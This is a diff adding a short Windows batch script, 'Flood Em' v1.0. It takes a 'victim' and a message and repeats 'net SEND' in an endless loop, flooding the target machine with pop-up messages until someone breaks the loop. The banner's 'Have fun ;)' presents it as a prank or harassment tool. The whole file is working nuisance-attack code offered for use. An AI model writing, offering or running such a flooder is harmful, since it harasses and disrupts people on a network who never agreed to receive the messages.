@@ -1,0 +1,28 @@
+@ECHO OFF
+
+IF %1.==. GOTO NP
+IF %2.==. GOTO NP
+GOTO FLOOD
+
+:NP
+ECHO -------------------------------------
+ECHO - Flood Em' v1.0 -
+echo -------------------------------------
+ECHO "Syntax : floodem <victim> <message>"
+ECHO -------------------------------------
+ECHO - Have fun ;) -
+ECHO - - JH -
+ECHO -------------------------------------
+
+GOTO END
+
+:FLOOD
+ECHO.
+ECHO Press CTRL-BREAK to quit
+PAUSE
+
+:FLOODLOOP
+net SEND %1 %2
+GOTO FLOODLOOP
+
+:END
